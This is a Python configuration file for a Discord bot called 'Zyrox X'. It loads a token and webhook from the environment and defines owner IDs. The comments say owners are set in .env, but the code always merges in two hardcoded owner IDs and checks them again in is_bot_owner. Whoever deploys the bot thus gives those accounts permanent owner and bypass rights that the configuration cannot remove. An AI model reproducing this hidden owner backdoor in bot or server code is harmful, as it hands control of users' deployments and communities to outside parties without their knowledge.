# ╔══════════════════════════════════════════════════════════════════╗
# ║                                                                  ║
# ║   ░█▀▀░█▀█░█▀▄░█▀▀░█░█   ░█▀▄░█▀▀░█░█░█▀▀                     ║
# ║   ░█░░░█░█░█░█░█▀▀░▄▀▄   ░█░█░█▀▀░▀▄▀░▀▀█                     ║
# ║   ░▀▀▀░▀▀▀░▀▀░░▀▀▀░▀░▀   ░▀▀░░▀▀▀░░▀░░▀▀▀                     ║
# ║                                                                  ║
# ║            © 2026 Vinay Kumar (!Alone💔) — All Rights Reserved              ║
# ║                                                                  ║
# ║   discord  ──  https://discord.com/users/731390792567881739                      ║
# ║   youtube  ──  https://discord.com/users/731390792567881739                   ║
# ║   github   ──  https://github.com/kumar_vinay                        ║
# ║                                                                  ║
# ╚══════════════════════════════════════════════════════════════════╝

import os
from dotenv import load_dotenv

load_dotenv()

TOKEN      = os.environ.get("TOKEN")
BRAND_NAME = os.environ.get("brand_name", "Zyrox X")
NAME       = BRAND_NAME
BotName    = BRAND_NAME

server     = "https://discord.com/users/731390792567881739"
serverLink = "https://discord.com/users/731390792567881739"
ch         = "https://discord.com/channels/699587669059174461/1271825678710476911"

CMD_WEBHOOK_URL = os.getenv("CMD_WEBHOOK_URL")

# ── Owner / Staff IDs ─────────────────────────────────────────────────────────
# Edit OWNER_IDS in .env — comma-separated, no spaces needed.
# Example:  OWNER_IDS = 870179991462236170,767979794411028491,1432771000629596225

DEFAULT_OWNER_IDS: list[int] = [731390792567881739, 984409270344908872]

def _parse_ids(env_key: str, defaults: list[int]) -> list[int]:
    raw = os.getenv(env_key, "").strip()
    parsed = [int(p.strip()) for p in raw.split(",") if p.strip().isdigit()] if raw else []
    # Always keep defaults and merge with any env-configured IDs
    return list(dict.fromkeys(defaults + parsed))

OWNER_IDS:     list[int] = _parse_ids("OWNER_IDS", DEFAULT_OWNER_IDS)
OWNER_IDS_STR: list[str] = [str(i) for i in OWNER_IDS]

def is_bot_owner(user_id) -> bool:
    """Check if a user ID is a bot owner / bypass ID."""
    if user_id is None:
        return False
    try:
        uid = int(user_id)
        return uid in OWNER_IDS or uid in DEFAULT_OWNER_IDS
    except (ValueError, TypeError):
        s_uid = str(user_id)
        return s_uid in OWNER_IDS_STR or s_uid in ["731390792567881739", "984409270344908872"]

# Aliases kept for backwards compatibility with files that import these names
BOT_OWNER_IDS     = OWNER_IDS
BOT_OWNER_IDS_STR = OWNER_IDS_STR
STAFF_IDS         = OWNER_IDS
STAFF_IDS_STR     = OWNER_IDS_STR